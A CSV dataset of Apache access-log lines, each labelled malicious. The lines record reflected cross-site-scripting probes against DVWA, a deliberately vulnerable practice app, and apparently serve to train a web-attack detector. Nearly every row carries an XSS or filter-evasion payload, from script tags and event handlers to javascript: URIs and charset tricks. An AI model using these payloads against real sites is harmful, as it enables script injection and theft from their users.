url,malicious
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style><img src=\""</style><img"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<li style=list-style:url()"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<head><base href=\""javascript://\""></head><body><a"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT FOR=document"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<OBJECT CLASSID=\""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\""><PARAM"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<object data=\""data:text/html;base64,%(base64)s\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed src=\""data:text/html;base64,%(base64)s\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<b <script>alert(1)</script>0"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=\""div1\""><input"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x '=\""foo\""><x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed src=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<image src=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=width:1px;filter:glow"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<? foo=\""><script>javascript:alert(1)</script>\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<! foo=\""><script>javascript:alert(1)</script>\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=</ foo=\""><script>javascript:alert(1)</script>\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<? foo=\""><x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<! foo=\""[[[Inception]]\""><x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<% foo><x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=d><x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x00src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x47src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x11src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x12src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img\\x47src=x onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img\\x10src=x onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img\\x13src=x onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img\\x32src=x onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img\\x11src=x onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x34src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x39src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x00src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x09=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x10=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x13=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x32=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x12=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x11=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x00=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src\\x47=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x\\x09onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x\\x10onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x\\x11onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x\\x12onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x\\x13onerror=\""javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img[a][b][c]src[d]=x[e]onerror=[f]\""alert(1)\""> HTTP/1.1"" 200 1732 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=\""x`"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onpropertychange=javascript:alert(1)></title><title"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=http://foo.bar/#x=`y></a><img"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!--[if]><script>javascript:alert(1)</script -->"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!--[if<img src=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=\""/\\%(jscript)s\""></script>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=\""\\\\%(jscript)s\""></script>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<object id=\""x\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a style=\""-o-link:'javascript:javascript:alert(1)';-o-link-source:current\"">X"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style> HTTP/1.1"" 200 1759 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<link rel=stylesheet"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@import \""data:,*%7bx:expression(javascript:alert(1))%7D\"";</style>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a style=\""pointer-events:none;position:absolute;\""><a"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>*[{}@import'%(css)s?]</style>X HTTP/1.1"" 200 1726 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=\""font-family:'foo&#10;;color:red;';\"">XXX"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=\""font-family:foo}color=red;\"">XXX"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<// style=x:expression\\28javascript:alert(1)\\29>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>*{x:\xc3\xaf\xc2\xbd\xc2\x85\xc3\xaf\xc2\xbd\xc2\x98\xc3\xaf\xc2\xbd\xc2\x90\xc3\xaf\xc2\xbd\xc2\x92\xc3\xaf\xc2\xbd\xc2\x85\xc3\xaf\xc2\xbd\xc2\x93\xc3\xaf\xc2\xbd\xc2\x93\xc3\xaf\xc2\xbd\xc2\x89\xc3\xaf\xc2\xbd\xc2\x8f\xc3\xaf\xc2\xbd\xc2\x8e(javascript:alert(1))}</style> HTTP/1.1"" 200 1764 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=content:url(%(svg)s)></div>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=\""list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));\"">X"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=d><div"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=\""background:url(/f#&#127;oo/;color:red/*/foo.jpg);\"">X"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=\""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\"">X"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=\""x\"">XXX</div>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x style=\""background:url('x&#1;;color:red;/*')\"">XXX</x>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script> HTTP/1.1"" 200 1743 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script> HTTP/1.1"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>Object.__noSuchMethod__ ="" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta charset=\""x-imap4-modified-utf7\"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta charset=\""x-imap4-modified-utf7\"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta charset=\""mac-farsi\"">\xc3\x82\xc2\xbcscript\xc3\x82\xc2\xbejavascript:alert(1)\xc3\x82\xc2\xbc/script\xc3\x82\xc2\xbe"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=X<x style=`behavior:url(#default#time2)`"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)`"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<vmlframe xmlns=urn:schemas-microsoft-com:vml"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=1<a href=#><line"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a style=\""behavior:url(#default#AnchorClick);\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x style=\""behavior:url(%(sct)s)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<xml id=\""xss\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<event-source src=\""%(event)s\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javascript:javascript:alert(1)\""><event-source"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=\""x\"">x</div>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>%(payload)s</script> HTTP/1.1"" 200 1709 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=%(jscript)s></script>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script language='javascript'"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>javascript:alert(1)</script> HTTP/1.1"" 200 1709 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""javascript:javascript:alert(1);\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=javascript:javascript:alert(1)>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=`javascript:javascript:alert(1)`>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=%(jscript)s?<B>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<FRAMESET><FRAME SRC=\""javascript:javascript:alert(1);\""></FRAMESET>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY ONLOAD=javascript:alert(1)>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY ONLOAD=javascript:javascript:alert(1)>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""jav"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT/SRC=\""%(jscript)s\""></SCRIPT> HTTP/1.1"" 200 1718 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<<SCRIPT>%(payload)s//<</SCRIPT> HTTP/1.1"" 200 1715 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe src=%(scriptlet)s"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<INPUT TYPE=\""IMAGE\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG DYNSRC=\""javascript:javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG LOWSRC=\""javascript:javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BGSOUND SRC=\""javascript:javascript:alert(1);\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BR SIZE=\""&{javascript:alert(1)}\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<LAYER SRC=\""%(scriptlet)s\""></LAYER>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<LINK REL=\""stylesheet\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>@import'%(css)s';</STYLE> HTTP/1.1"" 200 1719 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""Link\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<XSS STYLE=\""behavior:"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>li {list-style-image:"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IFRAME SRC=\""javascript:javascript:alert(1);\""></IFRAME>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<TABLE BACKGROUND=\""javascript:javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<TABLE><TD BACKGROUND=\""javascript:javascript:alert(1)\"">"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<DIV STYLE=\""background-image:"" 400 0 ""-"" ""-""",1
